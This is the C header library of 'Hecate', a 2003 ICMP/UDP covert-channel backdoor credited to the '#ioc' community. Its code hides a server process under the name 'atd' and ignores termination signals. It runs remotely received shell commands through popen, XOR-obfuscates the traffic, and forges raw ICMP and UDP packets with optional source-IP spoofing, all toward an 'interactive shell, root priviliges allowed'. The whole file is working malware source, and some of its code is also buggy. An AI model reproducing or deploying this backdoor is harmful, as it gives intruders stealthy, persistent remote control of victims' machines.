/* ######################################################################
 *
 *  HECATE.H    HECATE PROJECT LIBRARY V1.0
 *
 *		ICMP/UDP Encrypted Tunnel, written by the #ioc communauty	 
 * 		
 *		- Copyleft 2003 -
 *
 *	
 *
 *	Functions presented below :
 *        
 *	o int go_background (progname);
 *	o int proc_data (cmd, buf);
 *      o do_crypt(in, out);
 *	o open_socket(spoof, proto);	
 *	o int lookup (host_addr, to);
 *	o int timeout(sock);
 *	o send_ICMP(type, to, from, data, spoof);
 *	o send_UDP(port_dest, port_source, to, from, data, spoof);
 * 	
 *
 *#########################################################################
 */


#include 	<stdio.h>
#include 	<string.h>
#include	<unistd.h>
#include	<stdlib.h>
#include 	<netdb.h>
#include        <getopt.h> 
#include        <signal.h> 
#include        <sys/stat.h> 
#include 	<sys/ioctl.h>
#include 	<linux/if.h>
#include	<sys/types.h>
#include	<sys/socket.h>

#define HDRSIZE		28
#define CMD_SIZE 	200
#define PACKET_SIZE	4096
#define DATA_SIZE	PACKET_SIZE - HDRSIZE
#define DEFAULT_NUM	666
#define INCREMENT	5
#define CRYPTKEY	165
#define TIMEOUT		5

#define ICMPUSE		"using ICMP "
#define UDPUSE		"using UDP "
#define GREETZ		"-+ ICMP/UDP Crypted Tunnel - IOC Team, 2003 +-\n"
#define WELCOMEMSG      "interactive shell, root priviliges allowed\n"
#define SPOOFON		"spoof mode on, let's blind work today guys\n"
#define HIDEME		"server is hiding in background" 
#define NEED_ROOT	"sorry, you must be root\n"
#define NODATA		"NO DATAS RETURNED\n"
#define ROOTDIR		"/tmp"
#define HIDDENNAME	"atd"
#define COLORON		"\033[5;33m"
#define COLOROFF	"\033[0m"
#define PROMPT		"#"
#define PROMPTNAME      "hecate"
#define ERRRESOLV	"can't resolv hostname, sorry.\n"
#define ERRDOWN		"server seems to be down\n"
#define HELP		"?"
#define TURNOFF		"turnoff"
#define OFFMSG		"turning server off\n"
#define QUITCMD		"quit"
#define QUITMSG		"closing client, Bye.\n"

#define seq		un.echo.sequence



/* will contain our dgrams  */
char packet_to_send[PACKET_SIZE];
char packet_to_recv[PACKET_SIZE];

/* cmd and data buffers */
char clear_cmd[CMD_SIZE];
char crypted_cmd[CMD_SIZE];
char clear_data[DATA_SIZE];
char crypted_data[DATA_SIZE];


void 
prompt_help()
{
	fprintf(stderr, "all shell commands are allowed, use also:\n\n"
			"quit\t\tto close the client proprely\n"
			"turnoff\t\tto close both client and server\n"
			"?\t\tto print this help\n"
	);
}


/*
 * hides the server in the
 * background process list,
 * replacing the real progname
 */
int 
go_background(char *progname)
{
	int pid;

	if((pid = fork()) == -1)
		return -1; 
	

        /* PARENT PROCESS */
        if(pid > 0){
		sleep(1);
		exit(1); 
	}

        /* CHILD PROCESS */
	if(pid == 0){

		/* Stuff */
		umask(0);
		chdir(ROOTDIR);

		/* Sig */
                signal(SIGCHLD, SIG_DFL); // ?
                signal(SIGPIPE, SIG_IGN); // ignore broken pipes
		signal(SIGQUIT, SIG_IGN); // Ctrl+C won't work =p
                signal(SIGTERM, SIG_IGN); // nobody can stop me 
                signal(SIGSTOP, SIG_IGN); // I'm still here ! 


		/* Changing current progname */
                strncpy(progname, HIDDENNAME, strlen(HIDDENNAME));
		memset(progname + strlen(HIDDENNAME), '\0', 50);
                return getpid();  // returns child's PID
        }

	return 0;
}



/* 
 * close the listening socket if no 
 * response is returned from the server
 */
int 
timeout(int delay, int sock)
{
	int ret;
	fd_set  set;
	struct timeval timeout;

	timeout.tv_sec = delay;
	timeout.tv_usec = 0;
        FD_SET(sock, &set);
			
	if((ret = select(sock + 1, &set, NULL, NULL, &timeout)) == 0){
		printf("%s", ERRDOWN);
		return -1;	
	}

	return 0;
}


/*
 * executes the command buffer pointed by 'cmd'
 * and stores the output in a buffer pointed by 'buf'
 */

int 
proc_data (char *cmd, char *buf)
{
	int i;
	FILE *fd;

	memset(buf, '\0', DATA_SIZE);
	if((fd = popen(cmd, "r")) != NULL){
		i = fread(buf, 1, DATA_SIZE, fd);
		buf[DATA_SIZE]='\0';  
	} 

	bzero(&cmd, sizeof(cmd));
	pclose(fd);
	return i;
}


/*
 * do_crypt() encrypts or decrypts 
 * 'data' using a basic XOR way
 * and puts the crypted form in 'result'
 */

void 
do_crypt(char *data, char *result)
{
	int i;
	memset(result, '\0', strlen(result));
	for(i=0; i<strlen(data); i++){
		if(data[i] != '\x00')
			result[i] = data[i] ^ CRYPTKEY;
	}
}




/*
 * returns for any host_name and  
 * in_addr address type
 */
int 
lookup(char *host_name)
{
	struct in_addr addr;
	struct hostent *target;

  	if((target = gethostbyname(host_name)) != NULL){ 
		bzero(&addr, sizeof(struct in_addr));
		bcopy(target->h_addr, (char *)&addr.s_addr, target->h_length);
		return addr.s_addr;
	}

	else return -1;
}






/*
 * open_socket() ouvre une socket 
 * et renvoie un descripteur
 */ 

int 
open_socket(int spoof, int proto)
{
	int fd, on;

	/* check protocol */
	if(proto != 1 && proto != 17)
		return -1;


	
	if(!spoof)
	{       
		/*let the kernel fill the IP header */ 
       		if((fd = socket(AF_INET, SOCK_RAW, proto)) < 0)
		return -1;
	}

	
	else
	{ 
		/* spoof mode asked */
		if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
			return -1;

		on++; /* IP header is inclued with datas */
		if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1){
			perror("no raw ip today");	
			return -1;
			exit(1);
		}
	}

	return fd;
}





/*
 * Creats and sends ICMP_ECHO and ICMP_ECHOREPLY. 
 */ 

int
send_ICMP(int type, u_short seqnum, u_long dest_addr, u_long src_addr, char *data, int spoof)
{

	int sock, size;
	struct sockaddr_in dest;

	struct iphdr *my_ip;
	struct icmphdr *my_icmp;
	char *my_data;

	bzero(&packet_to_send, PACKET_SIZE);

	/* type check */
	if(type != ICMP_ECHO && type != ICMP_ECHOREPLY)
		return -1;
	
	if((sock = open_socket(spoof, IPPROTO_ICMP)) == -1){
		perror("open_socket()");
		return -1;
	}

	
	if(!spoof)
	{
		my_icmp = (struct icmphdr *)packet_to_send;
		my_data = (char *)(packet_to_send + 8);
		size = 8 + strlen(data);
	} 	

	else 
	{
		my_ip = (struct iphdr *)packet_to_send;
		my_icmp = (struct icmphdr *)(packet_to_send + 20);
		my_data = (char *)(packet_to_send + 28); 
		size = 28 + strlen(data);

		/* IP HEADER */
		my_ip->ihl = 5;
		my_ip->version = 4;
		my_ip->protocol = IPPROTO_ICMP;
		my_ip->id = htons(getpid());
		my_ip->tos = 0;
	 	my_ip->tot_len = size;
		my_ip->ttl = 255;
		my_ip->frag_off = 0;
		my_ip->check = 0;
		my_ip->saddr = src_addr;
		my_ip->daddr = dest_addr;
		
	}

	/* ICMP HEADER */
	my_icmp->type = type;
	my_icmp->un.echo.id = htons(getpid());
	my_icmp->un.echo.sequence = htons(seqnum);

	/* DATA */
	memcpy(my_data, data, strlen(data));

	/* sockaddr stuff */
	dest.sin_family = AF_INET;
  	dest.sin_addr.s_addr = dest_addr;

	if((sendto(sock, packet_to_send, size, 0, (struct sockaddr *)&dest, sizeof(dest))) == -1){
		close(sock);
		return -1;
	}

	close(sock);
	return 0;
}



int
send_UDP(u_short dest_port, u_short src_port, u_long dest_addr, u_long src_addr, char *data, int spoof)
{

	int sock, size;
	struct sockaddr_in dest;

	struct iphdr *my_ip;
	struct udphdr *my_udp;
	char *my_data;

	bzero(&packet_to_send, PACKET_SIZE);

	if((sock = open_socket(spoof, IPPROTO_UDP)) == -1){
		perror("open_socket()");
		return -1;
	}

	if(!spoof)
	{
		my_udp = (struct udphdr *)packet_to_send;
		my_data = (char *)(packet_to_send + 8);
		size = 8 + strlen(data);	
	} 


	else 
	{
		my_ip = (struct iphdr *)packet_to_send;
		my_udp = (struct udphdr *)(packet_to_send + 20);
		my_data = (char *)(packet_to_send + 28); 
		size = 28 + strlen(data);
		
		/* IP HEADER */
		my_ip->ihl = 5;
		my_ip->version = 4;
		my_ip->protocol = IPPROTO_UDP;
		my_ip->id = htons(getpid());
		my_ip->tos = 0;
	 	my_ip->tot_len = size;
		my_ip->ttl = 255;
		my_ip->frag_off = 0;
		my_ip->check = 0;
		my_ip->saddr = src_addr;
		my_ip->daddr = dest_addr;

	}

	/* ICMP HEADER */
	my_udp->dest = htons(dest_port);
	my_udp->source = htons(src_port);
	my_udp->len = strlen(my_data) + sizeof(struct udphdr);

	/* DATA */
	memcpy(my_data, data, strlen(data));


	/* sockaddr stuff */
	bzero(&dest, sizeof(struct sockaddr));
	dest.sin_family = AF_INET;
  	dest.sin_addr.s_addr = dest_addr;

	if((sendto(sock, packet_to_send, size, 0, (struct sockaddr *)&dest, sizeof(dest))) == -1){
		close(sock);
		return -1;
	}

	close(sock);
	return 0;
}

